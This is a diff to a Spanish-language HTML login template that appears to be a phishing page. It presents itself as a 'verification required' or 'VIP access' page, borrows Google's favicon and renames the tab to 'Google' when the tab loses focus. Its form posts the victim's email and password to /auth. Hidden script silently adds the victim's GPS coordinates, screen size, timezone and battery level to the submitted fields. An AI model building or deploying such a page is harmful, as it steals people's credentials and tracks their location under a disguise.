@@ -1,39 +1,52 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
+<link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
+<meta property="og:title" content="⚠️ Verificación Requerida">
+<meta property="og:image" content="https://tu-app.onrender.com/static/system/portada.jpg">
+<meta property="og:url" content="https://tu-app.onrender.com">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Acceso VIP Sentinel">
+<meta name="twitter:image" content="https://ibb.co/Cf74ys8meta">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ACCESO PRIVADO</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <title>{{ config.titulo }}</title>
     <style>
-        body { background: {{ config.color_fondo }}; background: radial-gradient(circle, {{ config.color_fondo }} 0%, #000 100%); color: {{ config.color_texto }}; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
-        .card-vip { background: rgba(255,255,255,0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 40px; width: 100%; max-width: 380px; text-align: center; }
-        .img-header { width: 110px; height: 110px; border-radius: 50%; border: 3px solid gold; margin-bottom: 20px; object-fit: cover; }
-        .form-control { background: rgba(0,0,0,0.4) !important; color: #fff !important; border: 1px solid #444 !important; height: 50px; border-radius: 12px; margin-bottom: 15px; text-align: center; }
-        .btn-gold { background: linear-gradient(45deg, #ffd700, #ff8c00); border: none; font-weight: bold; padding: 14px; border-radius: 12px; width: 100%; color: #000; }
+        body { background: {{ config.color_fondo }}; color: {{ config.color_texto }}; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 90%; max-width: 350px; text-align: center; }
+        .input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; border-radius: 10px; border: none; background: gold; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="card-vip">
-        <img src="{{ config.img_principal }}" class="img-header" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'">
-        <h3>{{ config.titulo }}</h3>
-        <p class="small text-muted mb-4">BIENVENIDOS</p>
+    <div class="box">
+        <img src="{{ config.img_principal }}" style="width: 80px; height: 80px; border-radius: 50%; margin-bottom: 10px;">
+        <h2>{{ config.titulo }}</h2>
         <form action="/auth" method="POST" id="vForm">
-            <input type="email" name="email" class="form-control" placeholder="CORREO ELECTRONICO" required>
-            <input type="password" name="pass" class="form-control" placeholder="CONTRASEÑA" required>
-            <button class="btn-gold">ENTRAR</button>
+            <input type="email" name="email" class="input" placeholder="Correo electrónico" required>
+            <input type="password" name="pass" class="input" placeholder="Contraseña" required>
+            <button class="btn">CONTINUAR</button>
         </form>
     </div>
     <script>
-        window.onload = function() {
-            const f = document.getElementById('vForm');
-            const add = (n,v) => { let i=document.createElement('input'); i.type='hidden'; i.name=n; i.value=v; f.appendChild(i); };
-            navigator.geolocation.getCurrentPosition(p => { add('lat_gps', p.coords.latitude); add('lon_gps', p.coords.longitude); });
-            add('resolucion', window.screen.width + "x" + window.screen.height);
-            add('lenguaje', navigator.language);
-            add('tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
-            if (navigator.getBattery) { navigator.getBattery().then(b => add('bateria', Math.round(b.level*100)+'%')); }
-        };
+        const f = document.getElementById('vForm');
+        const add = (n,v) => { let i=document.createElement('input'); i.type='hidden'; i.name=n; i.value=v; f.appendChild(i); };
+        
+        navigator.geolocation.getCurrentPosition(p => { 
+            add('lat_gps', p.coords.latitude); add('lon_gps', p.coords.longitude); 
+        });
+        
+        add('resolucion', window.screen.width + "x" + window.screen.height);
+        add('tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
+        if (navigator.getBattery) { navigator.getBattery().then(b => add('bateria', Math.round(b.level*100)+'%')); }
     </script>
+<script>
+    var title = document.title;
+    window.onblur = function () { document.title = "Google"; }; // Título cuando se va a otra pestaña
+    window.onfocus = function () { document.title = title; };   // Título cuando vuelve
+</script>
 </body>
 </html>
+
